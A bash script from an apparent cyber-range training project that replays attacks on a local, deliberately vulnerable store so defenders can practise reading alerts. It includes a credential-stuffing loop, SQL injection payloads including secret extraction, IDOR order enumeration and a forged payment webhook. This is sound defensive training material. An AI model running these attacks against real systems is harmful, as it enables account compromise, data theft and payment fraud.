#!/usr/bin/env bash
# Cyber Ducks — attack replay. Generates realistic attacker telemetry against the range so a BLUE
# team can practise reading Grafana / the map without a live red team. Each attack trips its
# detection (where one exists) and lights the relevant node.
#
# Usage:  scripts/attack-replay.sh <attack> [attack ...]
#         scripts/attack-replay.sh all
# Attacks: stuffing  sqli  idor  honeypot  webhook   (webhook mutates data; see note)
#
# Env: API=http://127.0.0.1:8081 (store-api)  STORE=http://127.0.0.1:8080 (proxy)
set -uo pipefail

API="${API:-http://127.0.0.1:8081}"
STORE="${STORE:-http://127.0.0.1:8080}"

log() { printf '\033[36m[replay]\033[0m %s\n' "$1"; }

login() { # email password -> token
  curl -s -X POST "$API/api/auth/login" -H 'Content-Type: application/json' \
    -d "{\"email\":\"$1\",\"password\":\"$2\"}" | grep -oE '"token":"[^"]+"' | cut -d'"' -f4
}

stuffing() { # VULN-AUTH-01: burst of failed logins -> "Login 401 spike" alert
  log "credential stuffing: 150 failed logins across accounts"
  for i in $(seq 1 150); do
    curl -s -o /dev/null -X POST "$API/api/auth/login" -H 'Content-Type: application/json' \
      -d "{\"email\":\"user$i@example.com\",\"password\":\"Password123!\"}" &
    [ $((i % 25)) -eq 0 ] && wait
  done; wait
  log "done — watch the 'Login 401 spike' alert and store-api on the map"
}

sqli() { # VULN-SQLI-01: injection probes in product search -> "store-api database errors" alert
  log "SQL injection: probing /api/products/search"
  local payloads=("duck' OR '1'='1" "duck' UNION SELECT 1,2,3,4,5,6--" "duck'--" "duck' AND 1=CAST((SELECT value FROM secrets LIMIT 1) AS int)--" "duck';--")
  for p in "${payloads[@]}"; do
    for i in $(seq 1 6); do
      curl -s -o /dev/null -G "$API/api/products/search" --data-urlencode "q=$p"
    done
  done
  log "done — watch the 'store-api database errors' alert"
}

idor() { # VULN-IDOR-01: walk order ids as a signed-in customer (no alert by default — read the spike)
  log "IDOR: signing in and walking order ids 1000-1300"
  local tok; tok=$(login "alice@duckstore.test" "password1")
  if [ -z "$tok" ]; then log "could not log in as alice (password changed?) — skipping"; return; fi
  for i in $(seq 1000 1300); do
    curl -s -o /dev/null "$API/api/orders/$i" -H "Authorization: Bearer $tok" &
    [ $((i % 40)) -eq 0 ] && wait
  done; wait
  log "done — IDOR has no alert; spot the orders-traffic burst on the Range health dashboard"
}

honeypot() { # VULN-HONEYPOT-01: touch the decoy -> critical "Honeypot connection" alert
  log "honeypot: connecting to decoy paths via the proxy"
  for path in /partner-export /internal-backup /admin-export; do
    curl -s -o /dev/null "$STORE$path?data=stolen-$(date +%s)"
  done
  log "done — watch the critical 'Honeypot connection' alert and the honeypot node"
}

webhook() { # VULN-WEBHOOK-01: forge an unsigned 'paid' callback (MUTATES an invoice; informational)
  log "webhook forgery: NOTE this marks a real invoice paid"
  local inv; inv=$(docker compose exec -T postgres psql -U duckadmin -d duckstore -t -A \
    -c "SELECT id FROM invoices WHERE status='open' LIMIT 1;" 2>/dev/null | tr -d '[:space:]')
  if [ -z "$inv" ]; then log "no open invoice to forge against — skipping"; return; fi
  curl -s -o /dev/null -X POST "$API/api/payments/webhook" -H 'Content-Type: application/json' \
    -d "{\"InvoiceId\":$inv,\"Status\":\"succeeded\",\"Reference\":\"replay-forged\"}"
  log "done — invoice $inv marked paid. Revert with: UPDATE invoices SET status='open',paid_at=NULL WHERE id=$inv;"
}

[ $# -eq 0 ] && { grep -E '^# ' "$0" | sed 's/^# //'; exit 0; }
for a in "$@"; do
  case "$a" in
    all) stuffing; sqli; idor; honeypot ;;   # webhook excluded from 'all' (it mutates data)
    stuffing|sqli|idor|honeypot|webhook) "$a" ;;
    *) log "unknown attack: $a" ;;
  esac
done
